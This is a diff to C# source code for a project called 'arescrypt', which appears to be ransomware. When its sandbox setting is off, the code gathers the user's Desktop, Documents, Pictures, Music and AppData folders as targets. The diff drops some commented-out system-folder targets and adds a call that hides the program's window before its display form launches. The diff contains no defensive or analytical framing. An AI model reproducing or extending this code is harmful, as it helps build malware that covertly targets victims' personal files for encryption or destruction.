@@ -36,19 +36,12 @@ namespace arescrypt
                     Console.WriteLine("Sandbox mode was enabled, but no sandbox directory was discovered.\nPlease create this directory: " + config.sandBoxDirectory);
             else if (!config.sandBox)
             {
-                //*
                 // User specific directories, administrative rights shouldn't be required in order to write to these files
                 userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
                 userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
                 userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
                 userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
                 userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
-
-                // System specific directories, administrative rights may be required in order to write to these files
-                //systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
-                //systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
-                //systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.System));
-                //*/
             }
             
             var userSpecificFiles = new List<string> { };
@@ -84,6 +77,7 @@ namespace arescrypt
             }
             else if (!config.debugMode) // == false
             {
+                Misc.HideWindow();
                 Application.EnableVisualStyles();
                 Application.SetCompatibleTextRenderingDefault(false);
                 Application.Run(new Display());
